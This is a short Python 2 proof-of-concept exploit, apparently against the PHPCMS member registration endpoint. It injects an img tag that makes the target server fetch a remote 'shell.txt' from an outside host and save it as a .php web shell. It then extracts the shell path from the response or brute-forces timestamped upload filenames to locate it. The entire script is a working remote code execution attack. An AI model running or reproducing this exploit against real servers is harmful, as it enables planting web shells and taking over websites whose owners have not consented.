import re
import requests
import random
import time

def randomstring(length):
    s = ''
    dic = "abcdefghijklmnopqrstuvwxyz"
    for i in range(int(length)):
        s += dic[random.randint(0,25)]
    return s

def poc(url):
    u = '{}/index.php?m=member&c=index&a=register&siteid=1'.format(url)
    data = {
        'siteid': '1',
        'modelid': '11',
        "username": "%s"%randomstring(12),
        "password": "%s"%randomstring(12),
        "email": "%s@qq.com"%randomstring(12),
        'info[content]': '<img src=http://www.blogsir.com.cn/lj_ctf/shell.txt?.php#.jpg>',
        'dosubmit': '1',
    }
    headers = {
        'cookie:':'PHPSESSID=t3id73sqv3dbnkhbbd0ojeh5r0; XDEBUG_SESSION=PHPSTORM'
    }
    rep = requests.post(u, data=data)
    #print rep.content

    shell = ''
    re_result = re.findall(r'&lt;img src=(.*)&gt', rep.content)
    if len(re_result):
        shell = re_result[0]
        if shell:
            print 'shell:',shell

    tmp = time.strftime('%Y%m%d%I%M%S',time.localtime(time.time()))
    path = time.strftime('%Y',time.localtime(time.time()))+'/'+time.strftime('%m%d',time.localtime(time.time()))+'/'
    for i in range(100,999):
        filename = tmp+str(i)+'.php'
        shell = url+'uploadfile/'+path+filename
        req = requests.get(url=shell)
        if req.status_code == 200:
            print 'brute shell:',shell
            break


if __name__ == '__main__':
    poc('http://localhost/')

